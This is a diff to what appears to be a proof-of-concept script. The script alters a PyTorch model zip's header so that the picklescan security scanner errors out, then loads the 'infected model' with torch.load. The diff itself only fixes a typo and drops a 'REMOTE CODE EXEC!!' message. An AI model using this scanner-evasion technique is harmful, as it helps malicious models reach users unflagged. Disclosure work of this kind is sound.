@@ -32,7 +32,7 @@ torch.save(model, zip_file)
 scan(zip_file)
 
 # modify the header to cause the zip file to raise execution in picklescan
-print("Modifying the header to cause the zip file to raise execution in picklescan")
+print("Modifying the header to cause the zip file to raise exception in picklescan")
 with open(zip_file, "rb") as f:
     data = f.read()
 
@@ -54,6 +54,3 @@ sleep(5)
 print("calling torch.load")
 
 torch.load(zip_file)  # Load the infected model
-
-sleep(5)
-print("REMOTE CODE EXEC!!")
